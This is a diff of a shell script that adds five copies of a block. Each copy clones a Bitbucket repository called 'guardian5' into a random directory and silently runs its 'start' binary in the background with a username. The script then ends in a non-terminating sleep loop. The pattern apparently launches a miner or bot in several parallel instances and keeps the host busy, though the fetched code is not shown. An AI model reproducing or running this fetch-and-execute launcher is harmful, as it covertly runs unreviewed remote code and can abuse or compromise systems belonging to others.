@@ -104,4 +104,39 @@ cd guardian5
 USERNAME=$1
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
+mk=$(shuf -n 1 -i 1-999999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+USERNAME=$1
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+mk=$(shuf -n 1 -i 1-999999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+USERNAME=$1
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+mk=$(shuf -n 1 -i 1-999999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+USERNAME=$1
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+mk=$(shuf -n 1 -i 1-999999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+USERNAME=$1
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+mk=$(shuf -n 1 -i 1-999999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+USERNAME=$1
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
 time=${1-1}; while test $time -gt 0; do printf "$time"; sleep 60; done
